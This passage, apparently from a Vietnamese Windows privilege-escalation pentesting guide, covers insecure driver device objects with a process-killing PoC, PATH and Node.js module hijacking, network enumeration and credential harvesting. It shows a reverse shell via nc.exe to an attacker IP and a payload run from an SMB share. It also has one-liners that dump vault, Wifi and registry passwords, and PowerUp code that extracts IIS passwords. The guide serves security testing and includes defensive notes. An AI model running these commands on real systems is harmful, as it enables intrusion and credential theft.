Một số driver bên thứ ba đã ký tạo device object bằng SDDL mạnh thông qua IoCreateDeviceSecure nhưng quên đặt FILE_DEVICE_SECURE_OPEN trong DeviceCharacteristics. Nếu thiếu flag này, secure DACL không được áp dụng khi mở device thông qua một đường dẫn có thêm thành phần, cho phép bất kỳ người dùng không có đặc quyền nào lấy được handle bằng cách sử dụng đường dẫn namespace như sau:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (trong một trường hợp ngoài thực tế)

Khi người dùng có thể mở device, có thể lạm dụng các IOCTL đặc quyền do driver cung cấp để thực hiện LPE và can thiệp. Các khả năng đã được ghi nhận ngoài thực tế:
- Trả về handle toàn quyền đến các process tùy ý (đánh cắp token / tạo SYSTEM shell qua DuplicateTokenEx/CreateProcessAsUser).
- Đọc/ghi raw disk không hạn chế (can thiệp offline, thủ thuật persistence lúc khởi động).
- Terminate các process tùy ý, bao gồm Protected Process/Light (PP/PPL), cho phép kill AV/EDR từ user land thông qua kernel.

Pattern PoC tối thiểu (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Biện pháp giảm thiểu dành cho nhà phát triển
- Luôn đặt FILE_DEVICE_SECURE_OPEN khi tạo các đối tượng thiết bị cần được giới hạn bằng DACL.
- Xác thực ngữ cảnh của caller đối với các thao tác có đặc quyền. Thêm các bước kiểm tra PP/PPL trước khi cho phép chấm dứt tiến trình hoặc trả về handle.
- Giới hạn IOCTL (access mask, METHOD_*, xác thực đầu vào) và cân nhắc dùng mô hình broker thay vì cấp trực tiếp đặc quyền kernel.

Ý tưởng phát hiện dành cho người phòng thủ
- Giám sát các lần mở từ user-mode đối với tên thiết bị đáng ngờ (ví dụ: \\ .\\amsdk*) và các chuỗi IOCTL cụ thể có dấu hiệu lạm dụng.
- Áp dụng danh sách chặn driver dễ bị tấn công của Microsoft (HVCI/WDAC/Smart App Control) và duy trì danh sách cho phép/từ chối của riêng bạn.


## PATH DLL Hijacking

Nếu bạn có **quyền ghi trong một thư mục nằm trên PATH**, bạn có thể chiếm quyền DLL được một tiến trình tải và **leo thang đặc quyền**.<sup>[[2]](#references)</sup>

Kiểm tra quyền của tất cả thư mục trong PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Để biết thêm thông tin về cách lạm dụng kiểm tra này:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Chiếm quyền phân giải module Node.js / Electron qua `C:\node_modules`

Đây là một biến thể **Windows uncontrolled search path**, ảnh hưởng đến các ứng dụng **Node.js** và **Electron** khi chúng thực hiện bare import như `require("foo")` và module dự kiến **không tồn tại**.<sup>[[20]](#references)</sup>

Node phân giải các package bằng cách đi ngược lên cây thư mục và kiểm tra các thư mục `node_modules` ở mỗi thư mục cha. Trên Windows, quá trình này có thể đi đến thư mục gốc ổ đĩa, vì vậy ứng dụng được khởi chạy từ `C:\Users\Administrator\project\app.js` có thể sẽ tìm kiếm tại:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Nếu **người dùng có quyền thấp** có thể tạo `C:\node_modules`, họ có thể đặt một file `foo.js` độc hại (hoặc thư mục package) và chờ một **tiến trình Node/Electron có quyền cao hơn** phân giải dependency bị thiếu. Payload chạy trong security context của tiến trình nạn nhân, vì vậy đây trở thành **LPE** khi mục tiêu chạy với quyền administrator, từ scheduled task/service wrapper được nâng quyền, hoặc từ ứng dụng desktop có quyền cao tự khởi động.

Điều này đặc biệt phổ biến khi:

- một dependency được khai báo trong `optionalDependencies`<sup>[[22]](#references)</sup>
- thư viện bên thứ ba bọc `require("foo")` trong `try/catch` và tiếp tục khi xảy ra lỗi
- một package bị xóa khỏi bản build production, bị bỏ qua trong quá trình đóng gói hoặc cài đặt thất bại
- lệnh `require()` dễ bị khai thác nằm sâu trong cây dependency thay vì trong mã ứng dụng chính

### Tìm kiếm mục tiêu dễ bị tấn công

Dùng **Procmon** để xác minh đường dẫn phân giải:<sup>[[23]](#references)</sup>

- Lọc theo `Process Name` = executable mục tiêu (`node.exe`, EXE của ứng dụng Electron hoặc tiến trình wrapper)
- Lọc theo `Path` `contains` `node_modules`
- Tập trung vào `NAME NOT FOUND` và lần mở thành công cuối cùng trong `C:\node_modules`

Các mẫu code-review hữu ích trong file `.asar` đã giải nén hoặc mã nguồn ứng dụng:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Khai thác

1. Xác định **tên package bị thiếu** từ Procmon hoặc qua việc xem xét mã nguồn.
2. Tạo thư mục tra cứu ở thư mục gốc nếu thư mục đó chưa tồn tại:

```powershell
mkdir C:\node_modules
```

3. Đặt một module có đúng tên được mong đợi:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kích hoạt ứng dụng mục tiêu. Nếu ứng dụng thử `require("foo")` và module hợp lệ không tồn tại, Node có thể tải `C:\node_modules\foo.js`.

Các ví dụ thực tế về module tùy chọn bị thiếu phù hợp với mẫu này gồm `bluebird` và `utf-8-validate`, nhưng **kỹ thuật** mới là phần có thể tái sử dụng: tìm bất kỳ **bare import** nào bị thiếu mà tiến trình Node/Electron chạy với quyền cao trên Windows sẽ phân giải.

### Ý tưởng phát hiện và hardening

- Cảnh báo khi người dùng tạo `C:\node_modules` hoặc ghi các tệp/gói `.js` mới vào đó.
- Tìm kiếm các tiến trình có integrity level cao đọc từ `C:\node_modules\*`.
- Đóng gói mọi runtime dependency trong môi trường production và kiểm tra việc sử dụng `optionalDependencies`.
- Rà soát mã bên thứ ba để tìm các mẫu `try { require("...") } catch {}` bị bỏ qua âm thầm.
- Tắt các probe tùy chọn nếu thư viện hỗ trợ (ví dụ: một số cấu hình triển khai `ws` có thể tránh probe `utf-8-validate` cũ bằng cách đặt `WS_NO_UTF_8_VALIDATE=1`).

## Mạng

### Chia sẻ

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### tệp hosts

Kiểm tra xem có máy tính đã biết nào khác được ghi cứng trong tệp hosts hay không.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Giao diện mạng & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Cổng đang mở

Kiểm tra các dịch vụ bị hạn chế từ bên ngoài

```bash
netstat -ano #Opened ports?
```

Đối với listener cục bộ, xác định chủ sở hữu process, đường dẫn executable và service hoặc scheduled task khởi chạy nó bằng cách đối chiếu PID. Remote-control service chỉ có thể cấp quyền truy cập với tư cách người dùng desktop nếu các cơ chế xác thực và kiểm soát lệnh của nó cho phép. Ứng dụng TCP tùy chỉnh chạy dưới tài khoản có đặc quyền cao hơn là một mục tiêu cần đánh giá riêng: listener và đường dẫn binary chỉ là manh mối thụ động, còn khả năng khai thác memory corruption đã xác thực đòi hỏi phân tích chính binary đó cùng đầu vào mà nó có thể tiếp nhận. Nếu một port đang mở có vẻ thuộc về process hệ thống, hãy đối chiếu với [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) trước khi xác định service backend; chỉ riêng quy tắc chuyển tiếp không chứng minh được đích có thể truy cập hoặc dễ bị tấn công.

### Bảng định tuyến

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Bảng ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Quy tắc Firewall

[**Xem trang này để biết các lệnh liên quan đến Firewall**](../basic-cmd-for-pentesters.md#firewall) **(liệt kê quy tắc, tạo quy tắc, tắt, tắt...)**

Xem thêm[ các lệnh liệt kê mạng tại đây](../basic-cmd-for-pentesters.md#network)

### Hệ thống con Windows dành cho Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Tệp nhị phân `bash.exe` cũng có thể được tìm thấy tại `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Nếu có quyền root, bạn có thể lắng nghe trên bất kỳ cổng nào (lần đầu dùng `nc.exe` để lắng nghe trên một cổng, GUI sẽ hỏi liệu có cho phép `nc` qua firewall hay không).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Để dễ dàng khởi chạy bash với quyền root, bạn có thể thử `--default-user root`

Bạn có thể khám phá hệ thống tệp `WSL` trong thư mục `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Tài khoản `root` trong Linux chạy bên trong WSL không tự cấp quyền Windows Administrator. Nếu danh tính Windows hiện tại có thể đọc hệ thống tệp của một bản phân phối, hãy kiểm tra các tệp lịch sử shell (bao gồm `/root/.bash_history`) để tìm các lệnh có thể đã ghi lại thông tin xác thực; việc leo thang quyền vẫn cần một tài khoản có quyền cao hơn hợp lệ và một phương thức xác thực được cho phép. Bố cục `LocalState\rootfs` áp dụng cho các bản cài đặt WSL cũ; WSL 2 thường lưu bản phân phối trong một đĩa ảo [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), vì vậy trước tiên hãy xác định bản phân phối và đường dẫn lưu trữ thực tế. Tránh in nội dung lịch sử lệnh trong quá trình liệt kê tự động.

## Thông tin xác thực Windows

### Thông tin xác thực Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` và `DefaultDomainName` là thông tin ngữ cảnh tài khoản, không phải thông tin xác thực. Giá trị `DefaultPassword` hoặc `AltDefaultPassword` không rỗng là một phát hiện về mật khẩu dạng plaintext trong registry. Nếu `AutoAdminLogon=1` nhưng không đọc được mật khẩu dạng plaintext, thì đây chỉ là manh mối: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), và việc đọc registry thông thường không xác định được liệu secret đó có tồn tại hoặc có thể truy xuất hay không. Hãy xem xét quyền truy cập và cấu hình đăng nhập thực tế trước khi báo cáo việc lộ thông tin xác thực.

### Trình quản lý thông tin xác thực / Windows vault

Từ [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault lưu trữ thông tin xác thực cho máy chủ, website và các chương trình khác mà **Windows** có thể dùng để **tự động đăng nhập người dùng**. Thoạt nghe, có thể nghĩ rằng người dùng có thể lưu thông tin xác thực cho các trang như Facebook, Twitter hoặc Gmail để trình duyệt tự động đăng nhập, nhưng thực tế không phải vậy.

Windows Vault lưu trữ thông tin xác thực mà Windows có thể dùng để tự động đăng nhập người dùng. Điều này có nghĩa là mọi **ứng dụng Windows cần thông tin xác thực để truy cập tài nguyên** (máy chủ hoặc website) **đều có thể sử dụng Credential Manager** và Windows Vault, rồi dùng thông tin xác thực được cung cấp thay vì yêu cầu người dùng nhập tên người dùng và mật khẩu mỗi lần.

Trừ khi các ứng dụng tương tác với Credential Manager, tôi không nghĩ chúng có thể sử dụng thông tin xác thực cho một tài nguyên cụ thể. Vì vậy, nếu ứng dụng muốn sử dụng vault, nó cần **giao tiếp với credential manager và yêu cầu thông tin xác thực cho tài nguyên đó** từ vault lưu trữ mặc định.

Dùng `cmdkey` để liệt kê thông tin xác thực được lưu trữ trên máy.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Sau đó, bạn có thể dùng `runas` với tùy chọn `/savecred` để sử dụng thông tin xác thực đã lưu. Ví dụ sau gọi một binary từ xa thông qua SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sử dụng `runas` với một bộ thông tin xác thực được cung cấp.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Lưu ý rằng có thể dùng mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) hoặc module Powershell [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Các ứng dụng UWP hiện đại của Windows, Microsoft Edge và các dịch vụ hệ thống hiện đại lưu token xác thực và mật khẩu dạng văn bản thuần bên trong `PasswordVault` của Universal Windows Platform (UWP) (cũng hiển thị dưới tên `Web Credentials` trong `vaultcmd`). Không gian lưu trữ này được cô lập theo phiên và có thể được giải mã trực tiếp mà không cần quyền quản trị hoặc `SeDebugPrivilege`.

Thực thi lệnh PowerShell này trong phiên đang hoạt động của người dùng để ngay lập tức trích xuất và giải mã tất cả tên người dùng cùng mật khẩu dạng văn bản thuần đã lưu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** cung cấp phương thức mã hóa dữ liệu đối xứng, chủ yếu được sử dụng trong hệ điều hành Windows để mã hóa đối xứng các khóa riêng tư bất đối xứng. Cơ chế mã hóa này sử dụng bí mật của người dùng hoặc hệ thống để góp phần đáng kể vào entropy.

**DPAPI cho phép mã hóa khóa thông qua khóa đối xứng được tạo ra từ thông tin đăng nhập bí mật của người dùng**. Trong các trường hợp mã hóa hệ thống, cơ chế này sử dụng thông tin bí mật xác thực miền của hệ thống.

Các khóa RSA của người dùng đã được mã hóa bằng DPAPI được lưu trong thư mục `%APPDATA%\Microsoft\Protect\{SID}`, trong đó `{SID}` đại diện cho [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) của người dùng. **Khóa DPAPI, nằm cùng với khóa chính bảo vệ các khóa riêng tư của người dùng trong cùng một tệp**, thường gồm 64 byte dữ liệu ngẫu nhiên. (Lưu ý rằng quyền truy cập vào thư mục này bị hạn chế, nên không thể liệt kê nội dung bằng lệnh `dir` trong CMD, nhưng có thể liệt kê bằng PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Bạn có thể dùng **mimikatz module** `dpapi::masterkey` với các tham số phù hợp (`/pvk` hoặc `/rpc`) để giải mã nó.

**Các tệp thông tin xác thực được bảo vệ bằng master password** thường nằm ở:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Bạn có thể dùng **module mimikatz** `dpapi::cred` cùng với `/masterkey` phù hợp để giải mã.\
Bạn có thể **trích xuất nhiều** **masterkey DPAPI** từ **memory** bằng module `sekurlsa::dpapi` (nếu bạn có quyền root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Thông tin xác thực PowerShell

**Thông tin xác thực PowerShell** thường được dùng cho các tác vụ **scripting** và tự động hóa, nhằm lưu trữ thông tin xác thực đã mã hóa một cách thuận tiện. Thông tin xác thực được bảo vệ bằng **DPAPI**, thường có nghĩa là chỉ cùng người dùng trên cùng máy tính đã tạo chúng mới có thể giải mã.

Tệp thông tin xác thực đã xuất có thể mang tên bất kỳ hoặc có đường dẫn `.xml`. Khi script hoặc danh sách kiểm kê tệp trỏ đến một tệp, hãy xác định thư mục hồ sơ thực tế của tài khoản thay vì mặc định là `C:\Users`: [Windows có thể đặt hồ sơ ở nơi khác](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Tệp có thể đọc được chỉ là manh mối; [Windows `Export-Clixml` liên kết thông tin xác thực đã mã hóa với người dùng và máy tính thực hiện thao tác xuất](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), và mọi tài khoản khôi phục được vẫn phải có quyền hợp lệ trên dịch vụ dự định sử dụng. Trước tiên, hãy kiểm tra đường dẫn và ACL mà không in các giá trị đã mã hóa hoặc dạng rõ trong quá trình liệt kê thông thường.

Để **giải mã** thông tin xác thực PS từ tệp chứa chúng, bạn có thể thực hiện như sau:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Các kết nối RDP đã lưu

Bạn có thể tìm thấy chúng tại `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
và tại `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Các lệnh đã chạy gần đây

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Trình quản lý thông tin xác thực Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use module `dpapi::rdg` của **Mimikatz** với `/masterkey` phù hợp để **giải mã mọi file .rdg**\
Bạn có thể **trích xuất nhiều DPAPI masterkey** từ bộ nhớ bằng module `sekurlsa::dpapi` của Mimikatz

**mRemoteNG sử dụng một kho lưu trữ kết nối khác.** Kiểm tra các file XML có thể đọc được trong `%APPDATA%\mRemoteNG` và thư mục Documents của người dùng, bao gồm cả các file có tên thông thường như `config.xml`. Xác định schema kết nối và các thuộc tính `Password` được mã hóa trước khi coi file XML là manh mối về thông tin xác thực. Giá trị được lưu không phải mật khẩu DPAPI/RDCMan; việc khôi phục phụ thuộc vào cài đặt mã hóa của file và việc có sử dụng mật khẩu master tùy chỉnh hay không. Tránh in các giá trị đã mã hóa khi liệt kê diện rộng.

**Các bản xuất profile Remote Desktop Plus** cũng có thể đọc được trong thư mục người dùng hoặc thư mục quản trị dùng chung. Bản xuất `profiles.xml` cũ có các mục `Data/Profile` với phần tử `ProfileName`, `Password` và `Secure`. Coi phần tử mật khẩu không rỗng là manh mối về thông tin xác thực, nhưng không in giá trị đó hoặc mặc định rằng nó là văn bản thuần: [ghi chú của nhà cung cấp](https://www.donkz.nl/) cho biết tính năng bảo vệ profile có thể được liên kết với tài khoản và máy tính đã tạo profile, hoặc được cấu hình ít nghiêm ngặt hơn. Xác minh nguồn gốc file và điều kiện khôi phục trước khi dựa vào nó.

### Sticky Notes

Mọi người thường dùng ứng dụng StickyNotes trên máy trạm Windows để **lưu mật khẩu** và thông tin khác mà không nhận ra đây là một file cơ sở dữ liệu. File này nằm tại `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` và luôn đáng để tìm kiếm và kiểm tra.

Đôi khi mọi người lưu mật khẩu và thông tin khác trong các ứng dụng ghi chú dán. Ứng dụng Sticky Notes dạng gói của Microsoft thường lưu ghi chú tại `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; các ứng dụng cũ hơn hoặc khác có thể dùng những kho lưu trữ khác trong hồ sơ người dùng, bao gồm LevelDB. Hãy xác định ứng dụng đã cài đặt và định dạng lưu trữ trước khi coi việc không tìm thấy file SQLite là bằng chứng không có ghi chú.

Nếu Sticky Notes đang sử dụng SQLite write-ahead logging, chỉ sao chép `plum.sqlite` có thể bỏ sót các ghi chú mới được xác nhận. Hãy giữ lại `plum.sqlite-wal` tương ứng cùng với bản sao nhất quán của cơ sở dữ liệu, đồng thời giữ cả `plum.sqlite-shm` nếu có; chỉ mục bộ nhớ dùng chung có thể được dựng lại, nhưng WAL là một phần trạng thái lâu dài của cơ sở dữ liệu. Xem [tài liệu WAL của SQLite](https://www.sqlite.org/wal.html). Ghi chú có chứa tên tài khoản hoặc mật khẩu chỉ là manh mối về thông tin xác thực: hãy xác minh riêng tài khoản, quyền truy cập được phép và việc dùng lại mật khẩu. Một bản ghi trình quản lý mật khẩu đã mã hóa còn cần khóa giải mã thực tế và cách diễn giải riêng của ứng dụng trước khi có thể xác nhận một thông tin đăng nhập có đặc quyền cao hơn.

### AppCmd.exe

**Lưu ý rằng để khôi phục mật khẩu từ AppCmd.exe, bạn cần có quyền Administrator và chạy ở mức High Integrity.**\
**AppCmd.exe** nằm trong thư mục `%systemroot%\system32\inetsrv\`.\
Nếu file này tồn tại, có thể một số **thông tin xác thực** đã được cấu hình và có thể **khôi phục**.

Đoạn mã này được trích từ [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Kiểm tra xem `C:\Windows\CCM\SCClient.exe` có tồn tại không .\
Các trình cài đặt được **chạy với đặc quyền SYSTEM**, nhiều trình dễ bị **DLL Sideloading (Thông tin từ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Tệp và Registry (Thông tin xác thực)

### Artifact thông tin xác thực trong registry của công cụ hỗ trợ

Một số bản cài đặt hỗ trợ từ xa cũ giữ các tên value liên quan đến mật khẩu dưới những registry key cố định của ứng dụng. Ví dụ, theo [giải thích về registry key của nhà cung cấp](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` của TeamViewer xác định mật khẩu phiên tĩnh đã cấu hình ở các phiên bản trước 9. Dấu hiệu từ tên value chỉ là đầu mối để xem xét: hãy xác minh phiên bản đã cài đặt, dữ liệu value có thể đọc được, định dạng và hành vi xác thực hiện tại trước khi đánh giá thông tin xác thực đó. Việc chuyển từ mật khẩu hỗ trợ từ xa sang tài khoản Windows có đặc quyền cao hơn còn đòi hỏi mật khẩu thực sự được dùng lại và tài khoản đó cho phép truy cập. Không đưa ciphertext và mật khẩu đã khôi phục vào kết quả liệt kê thông thường.

### Bảng tính dùng chung có trang tính được bảo vệ

Nếu nghi ngờ một workbook dùng chung có thể đọc được chứa dữ liệu tài khoản, hãy phân biệt **mã hóa tệp** với bảo vệ trang tính hoặc cột bị ẩn. [Microsoft nêu](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) rằng bảo vệ trang tính kiểm soát việc chỉnh sửa chứ không phải tính năng bảo mật; bản thân nó không chứng minh nội dung workbook đã được mã hóa. Chỉ xem xét các tệp có liên quan mà bạn được phép truy cập, và tránh in các bí mật tiềm năng trong quá trình liệt kê diện rộng. Chỉ riêng đường dẫn `.xlsx` có thể đọc được, trang tính được bảo vệ hoặc cột bị ẩn không chứng minh rằng có thông tin xác thực hay tài khoản nào có đặc quyền cao hơn; hãy xác minh riêng dữ liệu thực tế và quyền hiện tại của tài khoản.

### Bản vá thay đổi được CI server lưu lại

CI server có thể lưu các thay đổi mã nguồn đã gửi trong thư mục dữ liệu ngay cả sau khi build hoàn tất. [TeamCity ghi rõ](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` là nơi lưu trữ các thay đổi từ remote-run; thư mục dữ liệu có thể được cấu hình và không nhất thiết nằm dưới `ProgramData`. Bản vá có thể đọc được có thể lưu lại tham chiếu đã bị xóa hoặc được thêm vào cho tệp thông tin xác thực, khóa mã hóa hoặc script sử dụng cả hai. Ví dụ, quy trình PowerShell `ConvertTo-SecureString -Key` cần cả AES key lẫn chuỗi đã mã hóa; [Microsoft ghi rõ](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) rằng key được cung cấp riêng. Trước tiên, chỉ xem tên các bản vá có thể truy cập; sau đó, khi được phép, kiểm tra nội dung liên quan mà không in bí mật trong kết quả liệt kê thông thường. Chỉ riêng đường dẫn bản vá, giá trị đã mã hóa hoặc tham chiếu đến key không chứng minh thông tin xác thực hợp lệ hay quyền truy cập cao hơn. Hạn chế ACL của thư mục dữ liệu và tránh commit bí mật vào các thay đổi build.

### Xoay vòng mật khẩu administrator cục bộ tùy chỉnh

